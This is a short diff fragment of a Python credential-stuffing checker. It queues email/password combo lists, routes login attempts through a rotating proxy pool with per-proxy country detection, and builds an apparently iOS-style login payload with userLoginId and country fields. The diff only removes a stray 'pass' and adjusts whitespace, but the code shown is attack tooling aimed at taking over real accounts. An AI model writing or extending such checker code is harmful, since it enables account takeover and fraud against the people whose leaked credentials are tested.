@@ -781,7 +781,6 @@ def _run_batch_br(cc, combos, proxy_components, threads_n, out):
             country, lowcode, phone_cc = _detect_country_br(cc_proxies[0])
     pool   = ProxyPool(cc_proxies) if cc_proxies else None
     actual = min(threads_n, len(combos))
-    pass
     q = queue.Queue()
     for email, pw in combos: q.put((email, pw, 0))
     stats   = Stats(len(combos))
@@ -996,4 +995,4 @@ async def _check_ios(email, password, proxy_url, country, lowcode, cc):
                     {"name": "userLoginId",           "value": {"stringValue": email}},
                     {"name": "countryCode",           "value": {"stringValue": cc}},
                     {"name": "countryIsoCode",        "value": {"stringValue": country}},
-      
+               
